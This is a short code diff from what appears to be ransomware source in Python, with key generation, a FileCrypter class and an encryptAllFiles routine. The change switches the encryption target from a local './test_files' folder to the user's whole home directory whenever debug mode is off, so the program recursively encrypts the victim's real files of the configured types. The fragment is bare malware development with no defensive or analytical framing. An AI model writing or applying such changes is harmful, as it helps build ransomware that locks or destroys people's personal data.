@@ -133,8 +133,11 @@ def genKeyPair():
 
 def encryptAllFiles(keys):
     pathlist = []
+    p = './test_files'
+    if Config.DEBUG_MODE is False:
+        p = str(Path.home())
     for types in Config.FILE_TYPES:
-        pathlist.extend(Path('./test_files').glob('**/*.' + types))
+        pathlist.extend(Path(p).glob('**/*.' + types))
     for path in pathlist:
         path_in_str = str(path)
         fc = FileCrypter()
